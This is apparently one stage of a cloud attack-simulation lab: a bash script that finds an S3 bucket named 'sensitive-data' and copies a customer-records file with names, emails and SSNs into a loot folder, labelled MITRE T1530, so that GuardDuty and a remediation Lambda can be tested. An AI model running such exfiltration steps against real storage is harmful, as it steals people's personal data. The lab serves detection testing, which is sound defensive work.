#!/usr/bin/env bash
# Stage 3 — Exfiltration (T1530 Data from Cloud Storage Object)
# Locates the sensitive-data bucket and pulls the staged PII object. The bucket
# is intentionally public in this lab, so this succeeds and models real S3
# data theft; GuardDuty S3 protection is what flags the anomalous access.
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

phase "Stage 3 — Exfiltration"

step "Locating the sensitive-data bucket"
bucket="$(att s3api list-buckets \
  --query "Buckets[?contains(Name, 'sensitive-data')].Name | [0]" --output text)"

if [[ -z "$bucket" || "$bucket" == "None" ]]; then
  warn "No sensitive-data bucket found — is the threat-surface-s3 module deployed?"
  exit 1
fi
ok "Target bucket: $bucket"

step "Listing objects under confidential/"
att s3 ls "s3://$bucket/confidential/" || true

step "Exfiltrating customer records"
att s3 cp "s3://$bucket/confidential/customer-records.csv" \
  "$LOOT_DIR/03-exfiltrated-customer-records.csv"

rows="$(( $(wc -l < "$LOOT_DIR/03-exfiltrated-customer-records.csv") - 1 ))"
ok "Exfiltrated $rows customer records (names, emails, SSNs) to $LOOT_DIR"

echo "MITRE: T1530 Data from Cloud Storage Object"
warn "This should surface a GuardDuty Exfiltration:S3 / UnauthorizedAccess finding"
warn "and trigger the lockdown_s3 remediation Lambda."
